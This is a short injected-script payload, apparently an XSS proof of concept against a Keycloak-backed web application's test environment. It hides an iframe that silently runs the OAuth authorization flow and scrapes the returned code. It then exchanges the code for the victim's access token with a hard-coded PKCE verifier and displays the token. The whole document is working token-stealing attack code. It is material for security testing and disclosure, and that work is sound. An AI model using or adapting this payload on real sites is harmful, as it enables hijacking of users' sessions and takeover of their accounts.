<script>
window.addEventListener("DOMContentLoaded", ()=>{
let iframe=document.createElement("iframe");
iframe.style.display="none";
iframe.src="https://auth-tst.pilario.com/realms/home/protocol/openid-connect/auth?client_id=app-client&redirect_uri=https%3A%2F%2Fapp-tst.pilario.com%2Fscenarios&response_mode=fragment&response_type=code&scope=openid&code_challenge=HIpjx3bK2R4uMCn4NWhi-0zxs1VW3Peob31Y_BK5ncA&code_challenge_method=S256"
document.body.appendChild(iframe)
iframe.contentWindow.addEventListener("DOMContentLoaded", () => {var code=iframe.contentWindow.document.URL.split('#')[1].match(/(code=)(.*)/)[2];
var xhr=new XMLHttpRequest()
xhr.open('POST', 'https://auth-tst.pilario.com/realms/home/protocol/openid-connect/token');
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
var token=JSON.parse(xhr.responseText)
alert(token.access_token)
}}
xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
xhr.send(`code=${code}&grant_type=authorization_code&client_id=app-client&redirect_uri=https%3A%2F%2Fapp-tst.pilario.com%2Fscenarios&code_verifier=ps578XC8H3MW6cRiCveRJAWsP7JJ6QpSrrhsErOnwm5dE57vomHqXnk40ZhAasiLn1r8iALvlUapnrZYDRNUAuSLH2B44Fgj`)
})})</script>
